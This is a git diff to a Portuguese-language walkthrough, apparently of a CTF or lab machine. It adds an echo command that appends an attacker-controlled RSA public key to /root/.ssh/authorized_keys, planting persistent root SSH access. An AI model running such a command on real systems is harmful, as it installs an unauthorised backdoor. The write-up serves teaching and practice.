@@ -172,8 +172,12 @@ Geramos a chave em nossa máquina:
 E então, vamos escrever uma chave RSA no arquivo /root/.ssh/authorized_keys
 
 ![Image](https://i.imgur.com/Rw4kvD9.png)
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDahIdVfE+PSXj1pXUKgyl1srULxOZ8tczHrsxKW5OjWV8MtKTHLW0sGoYxT+d/vxS0/KaCVdLPYjbDXJ7+758TIHWi+km7Tx1UOnj+F0fuQhc3Kw51n+dc7CSMMGOWGS16cJj9VWjFklj8T0cLoOUzbT7If7Xn4Cwz0OzLth+heqqCFBQQjHrQj+5jFlGIQycu5BmbCuuu3Eh5rBArgrF2XMDXUkAZjARczjhIPzTM1MW7wKCAok+gS3u0Epry8ULEwJjhiXAXbCLGivInit7GU8Smk/JnmGkY4ZerJqNL4FsGlhjLgi9Bu9QnFF0ZPXLFQsL9M5oH7vN75ZS6KIno8D8naZT2eoK97zq4DE8q9FqOEWV/b2FNxTZgn3Mf/M8xbq0r/WQ/p4+66Ch7ypbyKKXOVSGgwh9wedZyzTwn/waU6lex0DD96RTwmxm7t2mVGTasMhdVVK+v9H7XhfiyEG6lKZIK2c6CNsbJ2Mzo43YaBylKyG0YRpwCNSxdgB0= root@antisec" >> /root/.ssh/authorized_keys
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-Agora usamos a chave e we are r00t ~
+
+Agora usamos a chave e we are r00t :~
 
 ![Image](https://i.imgur.com/Rw1wh5f.png)
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
